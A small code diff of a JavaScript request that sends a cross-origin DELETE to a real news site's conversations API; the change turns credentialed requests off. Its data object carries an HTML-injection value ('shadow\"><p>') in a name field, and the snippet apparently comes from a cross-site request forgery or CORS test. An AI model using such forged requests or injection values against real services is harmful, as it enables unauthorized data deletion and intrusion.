@@ -10,7 +10,7 @@
     req.open('DELETE','https://go.welt.de/api/conversations','true');
     data = {"first_name":"shadow\"><p>","last_name":"ahmed","country":"US","phone":"+19802165484","smsOptIn":true}
     req.setRequestHeader("Content-Type", "application/json");
-    req.withCredentials = true;
+    req.withCredentials = false;
     req.send();
 
     function reqListener() {
